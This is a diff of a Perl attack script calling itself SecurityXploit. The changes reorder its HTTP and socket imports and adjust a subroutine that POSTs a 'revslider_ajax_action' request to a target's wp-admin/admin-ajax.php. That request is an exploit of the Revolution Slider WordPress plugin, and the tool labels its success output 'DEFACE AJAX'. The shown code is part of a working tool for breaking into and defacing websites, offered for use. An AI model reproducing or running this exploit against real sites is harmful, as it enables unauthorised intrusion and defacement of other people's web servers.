@@ -5,20 +5,17 @@
 #securityXploit is under GNU General Public License v3.0 https://github.com/PhHitachi/SecurityXploit/blob/master/COPYING.GPL
 #Publish 02/12/2018
 use if $^O eq "MSWin32", Win32::Console::ANSI;
+use URI::URL;
 use Getopt::Long;
-use LWP;
 use LWP::UserAgent;
-use Term::ANSIColor;
+use IO::Select;
 use HTTP::Cookies;
 use HTTP::Response;
+use Term::ANSIColor;
 use HTTP::Request;
 use HTTP::Request::Common qw(POST);
 use HTTP::Request::Common qw(GET);
-use HTTP::Headers;
-use URI::URL;
-use IO::Select;
 use IO::Socket::INET;
-use MIME::Base64;
 my $ua = LWP::UserAgent->new;
 $ua->timeout(10);
 main:;
@@ -1607,7 +1604,6 @@ print color 'reset';
 ####################################################################################################
 ####################################################################################################
 sub revdef(){
-print colored ("DEFACE AJAX",'bold white');
 
 $ajx = $site . 'wp-admin/admin-ajax.php';
 
@@ -1617,6 +1613,7 @@ $lasba = POST $ajx, ['action' => 'revslider_ajax_action', 'client_action' => 'up
 $response = $ua->request($lasba);
 $stat = $response->content;
  if ($stat =~ /true/){
+print colored ("DEFACE AJAX",'bold white');
 print  " ......................... ";
 print color('bold white');
 print color('reset');
